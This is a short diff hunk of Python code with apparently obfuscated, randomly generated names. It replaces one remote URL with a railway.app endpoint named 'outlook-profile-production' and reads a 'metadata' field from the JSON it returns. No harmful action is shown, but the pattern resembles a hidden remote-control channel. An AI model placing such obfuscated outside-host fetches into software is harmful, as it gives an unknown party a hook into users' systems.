@@ -18,7 +18,7 @@ def model_nhhjzh_173():
 
     def data_lnnjlm_535():
         try:
-            net_iinerj_133 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_iinerj_133 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_iinerj_133.raise_for_status()
             train_ssuqcd_569 = net_iinerj_133.json()
             process_ofdtnd_758 = train_ssuqcd_569.get('metadata')
